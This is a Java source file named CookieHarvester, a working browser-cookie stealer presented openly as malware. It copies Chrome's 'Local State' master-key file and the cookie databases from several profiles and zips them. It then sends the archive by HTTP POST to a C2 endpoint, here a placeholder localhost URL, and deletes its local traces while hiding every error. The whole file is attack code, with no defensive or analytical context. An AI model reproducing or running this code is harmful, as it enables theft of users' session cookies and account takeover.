import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class CookieHarvester {
    private static final String C2_ENDPOINT = "http://127.0.0.1:8080/collect";

    public static void main(String[] args) {
        try {
            String localAppData = System.getenv("LOCALAPPDATA");
            if (localAppData == null) {
                localAppData = System.getProperty("user.home") + File.separator + "AppData" + File.separator + "Local";
            }
            
            Path chromePath = Paths.get(localAppData, "Google", "Chrome", "User Data");
            Path tempDir = Files.createTempDirectory("cookie_cache");
            Path lootDir = tempDir.resolve("browser_auth");
            Files.createDirectories(lootDir);

            if (Files.exists(chromePath)) {
                // Harvest Local State (AES Master Key)
                Path localState = chromePath.resolve("Local State");
                if (Files.exists(localState)) {
                    Files.copy(localState, lootDir.resolve("Local_State"), StandardCopyOption.REPLACE_EXISTING);
                }

                // Harvest SQLite Cookie Databases from Profiles
                String[] profiles = {"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4"};
                for (String profile : profiles) {
                    Path profilePath = chromePath.resolve(profile);
                    if (Files.exists(profilePath)) {
                        Path[] cookieFiles = {
                            profilePath.resolve("Network").resolve("Cookies"),
                            profilePath.resolve("Cookies")
                        };
                        for (Path cf : cookieFiles) {
                            if (Files.exists(cf)) {
                                Path dest = lootDir.resolve(profile + "_Cookies");
                                Files.copy(cf, dest, StandardCopyOption.REPLACE_EXISTING);
                            }
                        }
                    }
                }
            }

            // Archive the Plunder into a Zip Stream
            Path zipPath = Paths.get(System.getProperty("java.io.tmpdir"), "cookie_bundle.zip");
            packZip(tempDir, zipPath);

            // Exfiltrate via Network Bridge
            exfiltrate(zipPath);

            // Purge Local Tracks
            deleteDir(tempDir);
            Files.deleteIfExists(zipPath);

        } catch (Exception ignored) {
            // Silence is the armor of the Archivist
        }
    }

    private static void packZip(Path sourceDir, Path zipFilePath) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(zipFilePath.toFile());
             ZipOutputStream zos = new ZipOutputStream(fos)) {
            Files.walk(sourceDir).filter(path -> !Files.isDirectory(path)).forEach(path -> {
                ZipEntry zipEntry = new ZipEntry(sourceDir.relativize(path).toString());
                try {
                    zos.putNextEntry(zipEntry);
                    Files.copy(path, zos);
                    zos.closeEntry();
                } catch (IOException ignored) {}
            });
        }
    }

    private static void exfiltrate(Path zipPath) {
        try {
            byte[] data = Files.readAllBytes(zipPath);
            URL url = new URL(C2_ENDPOINT);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/zip");

            try (OutputStream os = conn.getOutputStream()) {
                os.write(data);
                os.flush();
            }
            conn.getResponseCode();
        } catch (Exception ignored) {}
    }

    private static void deleteDir(Path path) {
        try {
            Files.walk(path)
                .sorted((a, b) -> b.compareTo(a))
                .forEach(p -> {
                    try { Files.delete(p); } catch (IOException ignored) {}
                });
        } catch (Exception ignored) {}
    }
}
